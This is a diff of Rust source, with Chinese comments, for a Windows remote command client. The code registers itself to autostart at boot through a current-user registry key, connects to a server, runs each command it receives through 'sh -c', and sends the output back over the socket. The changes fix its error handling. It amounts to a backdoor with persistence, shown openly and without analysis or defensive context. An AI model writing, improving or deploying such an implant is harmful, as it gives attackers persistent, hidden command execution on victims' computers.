@@ -1,19 +1,23 @@
 use std::{
+    ffi::OsStr,
     io::{Read, Write},
     net::TcpStream,
+    os::windows::ffi::OsStrExt,
     process::Command,
     thread,
     time::Duration,
 };
 
 use winreg::{
-    enums::{HKEY_CURRENT_USER, REG_SZ},
+    enums::HKEY_CURRENT_USER,
     RegKey,
 };
 
 fn main() {
     // 设置开机自启动
-    set_autostart().expect("Failed to set autostart");
+    if let Err(e) = set_autostart() {
+        eprintln!("Failed to set autostart: {}", e);
+    }
 
     // 主循环，尝试连接服务端
     loop {
@@ -45,7 +49,7 @@ fn handle_connection(stream: &mut TcpStream) {
                 } else {
                     Command::new("sh")
                         .arg("-c")
-                        .arg(&command)
+                        .arg(&*command)  // 注意这里的解引用
                         .output()
                         .expect("Failed to execute command")
                 };
@@ -57,7 +61,10 @@ fn handle_connection(stream: &mut TcpStream) {
                     String::from_utf8_lossy(&output.stderr).to_string()
                 };
 
-                stream.write_all(result.as_bytes()).unwrap();
+                if let Err(e) = stream.write_all(result.as_bytes()) {
+                    println!("Error writing to stream: {}", e);
+                    break;
+                }
             }
             Ok(_) => break, // 连接关闭
             Err(e) => {
@@ -75,9 +82,10 @@ fn set_autostart() -> std::io::Result<()> {
 
     // 获取当前可执行文件路径
     let exe_path = std::env::current_exe()?;
+    let exe_path_str = exe_path.to_string_lossy().into_owned();
     
     // 设置注册表项
-    key.set_value("RustCommandClient", &exe_path.to_string_lossy().into_owned() as &str)?;
+    key.set_value("RustCommandClient", &exe_path_str)?;
 
     Ok(())
 }
